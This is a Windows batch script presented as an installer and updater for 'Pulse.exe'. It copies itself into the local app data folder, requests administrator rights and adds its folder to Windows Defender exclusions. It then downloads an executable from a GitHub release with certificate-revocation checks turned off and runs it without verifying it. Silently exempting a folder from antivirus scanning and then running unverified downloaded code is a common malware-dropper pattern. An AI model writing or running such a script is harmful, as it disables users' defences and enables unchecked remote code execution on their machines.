@echo off
setlocal enabledelayedexpansion

:: --------- Variables ---------
set "installFolder=%LOCALAPPDATA%\Pulse"
set "filePath=%installFolder%\Pulse.exe"
set "versionFile=%installFolder%\version.txt"
set "thisScript=%~f0"
set "thisScriptName=%~nx0"
set "copiedScript=%installFolder%\%thisScriptName%"
set "markerFile=%installFolder%\.installed"
set "repoOwner=dbeny"
set "repoName=PulseRelease"

:: --------- Get language-safe Desktop path ---------
for /f "usebackq delims=" %%d in (`powershell -NoProfile -Command "[Environment]::GetFolderPath('Desktop')"`) do set "desktopPath=%%d"

:: --------- Self-copy only ONCE ---------
if not exist "%markerFile%" (
    if /i not "%~dp0"=="%installFolder%\" (
        echo Performing initial installation...
        if not exist "%installFolder%" mkdir "%installFolder%"
        copy "%thisScript%" "%copiedScript%" /Y >nul
        echo installed>"%markerFile%"
        "%copiedScript%"
        exit /b
    )
)

:: --------- Check local version ---------
if exist "%versionFile%" (
    set /p localVersion=<"%versionFile%"
) else (
    set "localVersion=none"
)
echo Local version: %localVersion%

:: --------- Fetch latest version ---------
for /f "usebackq delims=" %%r in (`powershell -NoProfile -Command "try { (Invoke-RestMethod 'https://api.github.com/repos/%repoOwner%/%repoName%/releases/latest').tag_name } catch { '' }"`) do set "latestVersion=%%r"

if "%latestVersion%"=="" (
    echo Failed to retrieve latest version.
    pause
    exit /b
)
echo Latest version: %latestVersion%

:: --------- If up-to-date, just run Pulse.exe ---------
if /i "%localVersion%"=="%latestVersion%" (
    echo Pulse.exe is up to date.
    if not exist "%desktopPath%\Pulse.lnk" (
        echo Creating shortcut...
        powershell -NoProfile -Command ^
            "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut('%desktopPath%\Pulse.lnk'); $s.TargetPath = '%copiedScript%'; $s.WorkingDirectory = '%installFolder%'; $s.IconLocation = '%filePath%'; $s.Save()"
        echo Shortcut created.
    )
    echo Launching Pulse.exe...
    start "" "%filePath%"
    exit /b
)

:: --------- Only elevate for update ---------
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Update required. Requesting administrator privileges...
    powershell -NoProfile -Command "Start-Process -FilePath '%copiedScript%' -Verb RunAs -Wait"
    exit /b
)

:: --------- Admin section for updating ---------
echo Updating Pulse.exe to version %latestVersion%...

:: Kill any running instance of Pulse.exe to allow overwrite
taskkill /IM "Pulse.exe" /F >nul 2>&1

:: Remove read-only attribute if set
attrib -R "%filePath%" >nul 2>&1

:: Add Defender Exclusion (only once)
powershell -Command "Add-MpPreference -ExclusionPath '%installFolder%'" >nul
echo Folder added to Defender exclusions.

:: --------- Get Download URL ---------
for /f "usebackq delims=" %%r in (`powershell -NoProfile -Command "try { (Invoke-RestMethod 'https://api.github.com/repos/%repoOwner%/%repoName%/releases/latest').assets | Where-Object { $_.name -eq 'Pulse.exe' } | Select-Object -ExpandProperty browser_download_url } catch { '' }"`) do set "fileUrl=%%r"

if "%fileUrl%"=="" (
    echo Failed to retrieve download URL.
    pause
    exit /b
)

:: --------- Download and update ---------
curl -L --ssl-no-revoke -o "%filePath%" "%fileUrl%"
if %errorlevel% neq 0 (
    echo Download failed!
    pause
    exit /b
)
echo Download complete.
echo %latestVersion%>"%versionFile%"

:: --------- Create Shortcut (if needed) ---------
if not exist "%desktopPath%\Pulse.lnk" (
    echo Creating shortcut...
    powershell -NoProfile -Command ^
        "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut('%desktopPath%\Pulse.lnk'); $s.TargetPath = '%copiedScript%'; $s.WorkingDirectory = '%installFolder%'; $s.IconLocation = '%filePath%'; $s.Save()"
    echo Shortcut created.
)

:: --------- Run updated Pulse.exe ---------
echo Launching Pulse.exe...
start "" "%filePath%"
exit /b
